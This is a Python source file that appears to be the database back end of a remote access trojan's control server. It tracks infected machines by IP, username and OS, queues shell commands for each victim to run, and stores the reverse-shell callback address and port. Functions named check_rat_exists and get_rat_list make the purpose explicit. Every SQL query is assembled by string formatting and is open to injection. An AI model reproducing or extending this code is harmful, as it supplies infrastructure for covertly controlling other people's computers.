import sqlite3

### TODO DISPLAY OPERATING SYSTEM IN DB

# need to update for data created, indexes  #
def create():
    db = sqlite3.connect('apext.db')
    db.execute(''' CREATE TABLE users (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    os VARCHAR(32)NOT NULL,
    registered VARCHAR(32)NOT NULL,
    last_seen VARCHAR(32)NOT NULL
    ); ''')

    db.execute(''' CREATE TABLE command (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    command VARCHAR(32) NOT NULL
    ); ''')

    db.execute(''' CREATE TABLE rshell (
    user_ip VARCHAR(32) NOT NULL,
    username VARCHAR(32) NOT NULL,
    master_ip VARCHAR(32) NOT NULL,
    master_port VARCHAR(32) NOT NULL
    ); ''')

def register(ip, username, os, registered, last_seen):
    db = sqlite3.connect('apext.db')
    db.execute("INSERT INTO users VALUES('{0}', '{1}', '{2}', '{3}', '{4}');".format(ip, username, os, registered, last_seen))
    db.commit()
    db.execute("INSERT INTO command VALUES('{0}', '{1}', '{2}');".format(ip, username, 'ls'))
    db.commit()
    db.execute("INSERT INTO rshell VALUES('{0}', '{1}', '{2}', '{3}');".format(ip, username, '0.0.0.0', '0000'))
    db.commit()
    

def user_command(ip, username, command):
    db = sqlite3.connect('apext.db')
    db.execute("UPDATE command SET command = '{0}' WHERE user_ip='{1}' and username='{2}';".format(command ,ip, username))
    db.commit()

def rshell_master(ip, username, master_ip):
    db = sqlite3.connect('apext.db')
    db.execute("UPDATE rshell SET master_ip = '{0}' WHERE user_ip='{1}' and username='{2}';".format(master_ip, ip, username))
    db.commit()

def update_rshell_master_port(ip, username, master_port):
    db = sqlite3.connect('apext.db')
    db.execute("UPDATE rshell SET master_port='{0}' WHERE user_ip='{1}' and username='{2}';".format(master_port, ip, username))
    db.commit()

def get_rshell_master(ip, username):
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT master_ip FROM rshell WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
    return cur.fetchone()[0]

def get_rshell_master_port(ip, username):
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT master_port FROM rshell WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
    return cur.fetchone()[0]


def get_user_command(ip, username):
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT command FROM command WHERE user_ip="{0}" and username="{1}";'.format(ip, username))
    return cur.fetchone()[0]

def check_rat_exists(ip, username):
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT * FROM command WHERE user_ip="{0}" and username="{1}";'.format(ip, username))

    return cur.fetchone()

def remove_user_command(ip, username):
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute("UPDATE command SET command = ' ' WHERE user_ip='{0}' and username='{1}';".format(ip, username))
    db.commit()


def get_rat_list():
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT user_ip, username, os, registered, last_seen FROM users ;')
    return cur.fetchall()

def check_rat_existss(ip):
    db = sqlite3.connect('apext.db')
    cur = db.cursor()
    cur.execute('SELECT user_ip, username FROM command WHERE user_ip="{0}";'.format(ip))
    return cur.fetchone()

try:
    create()
except Exception as e:
    print(e)
    pass
